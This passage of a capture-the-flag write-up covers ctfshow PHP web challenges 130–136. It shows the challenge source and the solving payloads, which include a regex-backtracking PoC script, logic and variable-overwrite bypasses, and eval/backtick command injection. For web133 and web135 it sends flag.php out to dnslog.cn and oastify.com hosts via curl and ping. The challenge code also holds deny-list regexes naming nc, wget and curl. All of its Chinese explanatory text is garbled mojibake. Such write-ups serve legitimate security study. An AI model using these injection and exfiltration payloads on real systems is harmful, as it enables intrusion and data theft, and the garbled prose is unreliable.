keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>1ÔºâÁ¨¨‰∏Ä‰∏™Âà§Êñ≠„ÄÇ<br>.+?Ë°®Á§∫ÂåπÈÖç‰ªªÊÑèÂ≠óÁ¨¶‰∏Ä‰∏™ÊàñÂàôÂ§ö‰∏™„ÄÇ<br>.*? Ë°®Á§∫ÂåπÈÖç‰ªªÊÑèÂ≠óÁ¨¶0‰∏™ÊàñÂ§ö‰∏™„ÄÇ</p><p>. ÂåπÈÖçÈô§Êç¢Ë°åÁ¨¶ \n ‰πãÂ§ñÁöÑ‰ªª‰ΩïÂçïÂ≠óÁ¨¶„ÄÇ</p><ul><li>ÂåπÈÖçÂâçÈù¢ÁöÑÂ≠êË°®ËææÂºè‰∏ÄÊ¨°ÊàñÂ§öÊ¨°„ÄÇ<br>? ÂåπÈÖçÂâçÈù¢ÁöÑÂ≠êË°®ËææÂºèÈõ∂Ê¨°Êàñ‰∏ÄÊ¨°ÔºåÊàñÊåáÊòé‰∏Ä‰∏™ÈùûË¥™Â©™ÈôêÂÆöÁ¨¶„ÄÇ<br>&#x2F;i‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜô<br>&#x2F;s ÂåπÈÖç‰ªª‰ΩïÁ©∫ÁôΩÂ≠óÁ¨¶ÔºåÂåÖÊã¨Á©∫Ê†º„ÄÅÂà∂Ë°®Á¨¶„ÄÅÊç¢È°µÁ¨¶Á≠âÁ≠â„ÄÇ<br>È¢ò‰∏≠Êï¥‰∏™Ê≠£ÂàôË°®ËææÂºèÁöÑÊÑèÊÄùÂ∞±ÊòØÔºå‰ª•‰ªªÊÑè‰∏Ä‰∏™ÊàñÂ§ö‰∏™Â≠óÁ¨¶ÂºÄÂ§¥ÔºåÈÅáÂà∞ctfshowÂ∞±ÂåπÈÖçÔºå‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºå‰∏çËÉΩÊúâ‰ªª‰ΩïÁ©∫ÁôΩÂ≠óÁ¨¶„ÄÇ</li></ul><p>‰πüÂ∞±ÊòØËØ¥ËæìÂÖ•ÁöÑÂÜÖÂÆπÈáåÔºåctfshowÂâçÈù¢‰∏çËÉΩÊúâÂ≠óÁ¨¶„ÄÇ</p><p>2ÔºâÁ¨¨‰∫å‰∏™Âà§Êñ≠„ÄÇstriposÂáΩÊï∞Â¶ÇÊûúÊú™ÂèëÁé∞Â≠óÁ¨¶‰∏≤Â∞ÜËøîÂõû FALSE„ÄÇ<br>ÂÖ®Á≠â‰∫éÁöÑÊù°‰ª∂ÊòØÂøÖÈ°ªÂèåÊñπÁöÑÁ±ªÂûã‰πü‰∏ÄÊ†∑ÔºåÊâÄ‰ª•ctfshowÂú®È¶ñ‰ΩçËøîÂõûÁöÑ0‰∏éFLASE‰∏çÂÖ®Á≠â„ÄÇ</p><p>ÊâÄ‰ª•payload:<code>POST:f=ctfshow</code></p><h4 id="web131-Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø"><a href="#web131-Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø" class="headerlink" title="web131(Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø)"></a>web131(Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.laruence.com/2010/06/08/1579.html">Ê∑±ÊÇâÊ≠£Âàô(pcre)ÊúÄÂ§ßÂõûÊ∫Ø&#x2F;ÈÄíÂΩíÈôêÂà∂</a></p><p>Âú®php‰∏≠Ê≠£ÂàôË°®ËææÂºèËøõË°åÂåπÈÖçÊúâ‰∏ÄÂÆöÁöÑÈôêÂà∂ÔºåË∂ÖËøáÈôêÂà∂Áõ¥Êé•ËøîÂõûfalse</p><p>Poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># Construct the payload</span>preg <span class="token operator">=</span> <span class="token string">'very'</span> <span class="token operator">*</span> <span class="token number">250000</span> <span class="token operator">+</span> <span class="token string">'36Dctfshow'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'f'</span><span class="token punctuation">:</span> preg<span class="token punctuation">&#125;</span><span class="token comment"># The target URL</span>url <span class="token operator">=</span> <span class="token string">'https://b8e115f7-c0eb-4c76-9dd8-840b15166fb3.challenge.ctf.show/'</span><span class="token comment"># Send the POST request</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># Check for errors and print the response</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Response:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed to get a valid response. Status code:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="web132-PHPÈÄªËæëËøêÁÆóÁ¨¶ÁªïËøá"><a href="#web132-PHPÈÄªËæëËøêÁÆóÁ¨¶ÁªïËøá" class="headerlink" title="web132(PHPÈÄªËæëËøêÁÆóÁ¨¶ÁªïËøá)"></a>web132(PHPÈÄªËæëËøêÁÆóÁ¨¶ÁªïËøá)</h4><p>ËÆøÈóÆ<code>robots.txt</code>‚Äì&gt;<code>/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://www.cnblogs.com/hurry-up/p/10220082.html">PHP‰∏≠ÈÄªËæëËøêÁÆóÁ¨¶ÁöÑÈ´òÊïàÁî®Ê≥ï‚Äî&amp;&amp;Âíå||</a></p><p>ÂØπ‰∫é‚Äú‰∏é‚ÄùÔºà**&amp;&amp;<strong>Ôºâ ËøêÁÆóÔºö <strong>x &amp;&amp; y</strong> ÂΩì</strong>x<strong>‰∏∫</strong>false<strong>Êó∂ÔºåÁõ¥Êé•Ë∑≥ËøáÔºå‰∏çÊâßË°å</strong>y<strong>Ôºõ<br>ÂØπ‰∫é‚ÄúÊàñ‚ÄùÔºà</strong>||<strong>Ôºâ ËøêÁÆó Ôºö  <strong>x||y</strong> ÂΩì</strong>x<strong>‰∏∫</strong>true<strong>Êó∂ÔºåÁõ¥Êé•Ë∑≥ËøáÔºå‰∏çÊâßË°å</strong>y**„ÄÇ</p><p>ÊâÄ‰ª•payloadÔºö<code>?code=admin&amp;password=1&amp;username=admin</code></p><h4 id="web133-substrÁªïËøá-DNSlog-Collaborator-Client"><a href="#web133-substrÁªïËøá-DNSlog-Collaborator-Client" class="headerlink" title="web133(substrÁªïËøá DNSlog Collaborator Client)"></a>web133(substrÁªïËøá DNSlog Collaborator Client)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6‰∏™Â≠óÊØçÈÉΩËøò‰∏çÂ§üÂëÄ?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></code></pre><p>Êàë‰ª¨‰º†ÈÄí?F&#x3D;<code>$F</code>;+sleep 3Â•ΩÂÉèÁΩëÁ´ôÁ°ÆÂÆûsleep‰∫Ü‰∏Ä‰ºöËØ¥ÊòéÁöÑÁ°ÆÊâßË°å‰∫ÜÂëΩ‰ª§<br>ÈÇ£‰∏∫‰ªÄ‰πà‰ºöËøôÊ†∑Ôºü<br>Âõ†‰∏∫ÊòØÊàë‰ª¨‰º†ÈÄíÁöÑ<code>$F</code>;+sleep 3„ÄÇÂÖàËøõË°åsubstr()ÂáΩÊï∞Êà™Êñ≠ÁÑ∂ÂêéÂéªÊâßË°åeval()ÂáΩÊï∞<br>Ëøô‰∏™ÂáΩÊï∞ÁöÑ‰ΩúÁî®ÊòØÊâßË°åphp‰ª£Á†ÅÔºåÊòØshell_exec()ÂáΩÊï∞ÁöÑÁº©ÂÜôÔºåÁÑ∂ÂêéÂ∞±ÂéªÂëΩ‰ª§ÊâßË°å„ÄÇ<br>ËÄå$FÂ∞±ÊòØÊàë‰ª¨ËæìÂÖ•ÁöÑ<code>$F</code>;+sleep 3 ‰ΩøÁî®ÊúÄÂêéÊâßË°åÁöÑ‰ª£Á†ÅÂ∫îËØ•ÊòØ<br><code>$F</code>;+sleep 3,Â∞±ÊâßË°åÊàêÂäü<br>ËøôÈáåÂèØËÉΩÊúâÁÇπÁªïÔºåÊÖ¢ÊÖ¢ÁêÜËß£</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//?F=`$F`; sleep 3</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// `$F`; </span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eval("`$F`; "); -> eval("``$F`; sleep 3`; "); "`" Âè™‰ºöË¢´Â±ïÂºÄ‰∏ÄÊ¨°</span></code></pre><blockquote><p>Âà©Áî®<code>$F</code>;ËÆ©evalÊâßË°åshellËØ≠Âè•„ÄÇ<br>Ëøô‰∏Ä‰∏≤Â≠óÁ¨¶ÈïøÂ∫¶ÊòØ5ÔºåÂä†‰∏™Á©∫Ê†ºÔºåÊª°Ë∂≥substrÁöÑ6‰∏™Â≠óÁ¨¶Êà™ÂèñÔºåËÆ©evalÊâßË°å<code>$F</code>;</p><p>Â¶Ç‰º†ÈÄí<code>$F</code>;+sleep 3ÔºåÈ°µÈù¢‰ºösleep‰∏Ä‰ºö„ÄÇÂÖ∑‰ΩìÊâßË°åËøáÁ®ãÂ¶Ç‰∏ãÔºö<br>&#x3D;&#x3D;&gt;php:   eval(substr($F,0,6));<br>&#x3D;&#x3D;&gt;php:   eval(‚Äú<code>$F</code>; ‚Äú);<br>&#x3D;&#x3D;&gt;php:   eval(‚Äú&#96;&#96;$F<code>; sleep 3</code>; ‚Äú);<br>&#x3D;&#x3D;&gt;shell: <code>$F</code>; sleep 3<br>ÊâÄ‰ª•Â∞±ÊâßË°å‰∫Üsleep 3</p></blockquote><p>ÊñπÊ≥ï‰∏Ä(DNSlogÂ§ñÂ∏¶)ÔºöÔºàÊ≤°ÊàêÂäüÔºâ</p><p><a href="http://www.dnslog.cn/">Âú®Á∫øDNSlog</a></p><p>ÂÖàÂæóÂà∞‰∏Ä‰∏™ÂüüÂêçÔºåÁÑ∂ÂêéÂà©Áî®dnslogÂÆûÁé∞ÂëΩ‰ª§ÂõûÊòæ„ÄÇ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://haha.0iix2r.dnslog.cn/<span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span><span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.0iix2r.dnslog.cn</code></pre><p>Payload:</p><p>ÂΩìping‰∏Ä‰∏™ÂüüÂêçÊó∂‰ºöÂØπÂÖ∂ËøõË°å‰∏Ä‰∏™ÈÄíÂΩí DNS Êü•ËØ¢ÁöÑËøáÁ®ãÔºåËøô‰∏™Êó∂ÂÄôÂ∞±ËÉΩÂú®ÂêéÁ´ØËé∑ÂèñÂà∞ DNS ÁöÑÊü•ËØ¢ËØ∑Ê±ÇÔºåÂΩìÂëΩ‰ª§ÁúüÊ≠£Ë¢´ÊâßË°å‰∏îÂπ≥Âè∞Êî∂Âà∞ÂõûÊòæÊó∂Â∞±ËÉΩËØ¥ÊòéÊºèÊ¥ûÁ°ÆÂÆûÂ≠òÂú®„ÄÇ</p><p>flag.phpÊòØÂ§öË°åÔºåÈúÄË¶Ågrep‰∏Ä‰∏ãÔºåÂÖ∂Ê¨°‰∏çËÉΩÂê´ÊúâÁâπÊÆäÁ¨¶Âè∑ÔºåÊâÄ‰ª•trËÆæÁΩÆ‰∏Ä‰∏ãËøîÂõûÁªìÊûúÂè™Êê∫Â∏¶Â≠óÊØçÂíåÊï∞Â≠ó„ÄÇ</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php <span class="token operator">|</span> <span class="token function">grep</span> ctfshow <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.3aqybg.dnslog.cn <span class="token parameter variable">-c</span> <span class="token number">1</span></code></pre><p>ÊñπÊ≥ï‰∫å( Collaborator Client Curl -F):</p><p>‰ΩøÁî®curl -FÂëΩ‰ª§„ÄÇ-F ‰∏∫Â∏¶Êñá‰ª∂ÁöÑÂΩ¢ÂºèÂèëÈÄÅpostËØ∑Ê±Ç„ÄÇ</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+curl <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://smiegnphdyy8keqa8wcuo4ypfgl790xp.oastify.com</code></pre><p><img src="web133.png" loading="lazy"></p><h4 id="web134-ÂèòÈáèË¶ÜÁõñ"><a href="#web134-ÂèòÈáèË¶ÜÁõñ" class="headerlink" title="web134(ÂèòÈáèË¶ÜÁõñ)"></a>web134(ÂèòÈáèË¶ÜÁõñ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ÁúãÂà∞parse_strÂíåextract„ÄÇÂèòÈáèË¶ÜÁõñ<br>Á¨¨‰∏ÄÊù°ifÂà§Êñ≠ÔºåË¶ÅÊ±Çkey1Âíåkey2‰∏çËÉΩÈÄöËøágetÂíåpost‰º†ÈÄí„ÄÇ</p><p>parse_strÊòØÂØπgetËØ∑Ê±ÇËøõË°åÁöÑÂÜÖÂÆπËß£ÊûêÊàêÂèòÈáè„ÄÇ‰æãÂ¶Ç‰º†ÈÄí?a&#x3D;1ÔºåÊâßË°åÂêéÂ∞±ÊòØ$a&#x3D;1„ÄÇ<br>ÈÇ£‰πàÁõ∏ÂØπÁöÑÔºå‰º†ÈÄí<code>_POST</code>ÔºåÂ∞±ÊòØÂØπ<code>$_POST</code>ËøõË°åËµãÂÄºÔºåÊ≠£Â•ΩÂ∞±ÂèØ‰ª•ÁªïËøáifÊù°‰ª∂ÂØπpostÁöÑÈôêÂà∂„ÄÇ<br>extract() ÂáΩÊï∞‰ªéÊï∞ÁªÑ‰∏≠Â∞ÜÂèòÈáèÂØºÂÖ•Âà∞ÂΩìÂâçÁöÑÁ¨¶Âè∑Ë°®„ÄÇ</p><p>payloadÔºö<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Â∏àÂÇÖ‰ª¨Â±ÖÁÑ∂Á†¥Ëß£‰∫ÜÂâçÈù¢ÁöÑÔºåÈÇ£Â∞±Êù•‰∏Ä‰∏™Âä†Âº∫ÁâàÂêß"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÈôêÂà∂‰∫ÜËÆ∏Â§öÂëΩ‰ª§ÔºåpingÂèØ‰ª•Áî®ÔºåËØªÂèñÂëΩ‰ª§<code>nl</code>ÂèØ‰ª•Áî®„ÄÇ<br>grepË¢´ÈôêÂà∂‰∫ÜÔºåÂèØ‰ª•Áî®awkÊåáÂÆöË°åÂè∑ËæìÂá∫Ôºå‰∏çËøáÈúÄË¶ÅÈÄêË°åÊµãËØïÔºåÂú®15Ë°åÊúâflag„ÄÇÊàñËÄÖÂèÇËÄÉ‰πãÂâçflagÁöÑÊ†ºÂºèÔºå‰πüÂèØ‰ª•Êé®ÊµãÂá∫Êù•ÊòØ15„ÄÇ</p><p>Ëøô‰∏™È¢òËøòÊääflagÂàÜÊàê‰∫Ü‰∏§‰∏™ÔºåË°åÂè∑15Âíå16ÔºåÈúÄË¶ÅÊãºÊé•‰∏Ä‰∏ã„ÄÇ</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+ping <span class="token variable"><span class="token variable">`</span><span class="token function">nl</span> flag.php<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'NR==15'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.i1k4phddlneygl58oqbjxv93full9a.oastify.com</code></pre><p>ÂèëÁé∞Êñ∞Ëß£Ê≥ïÔºö</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span>+<span class="token punctuation">;</span>cp+flag.php+1.txt</code></pre><h4 id="web136-tee"><a href="#web136-tee" class="headerlink" title="web136(tee)"></a>web136(tee)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 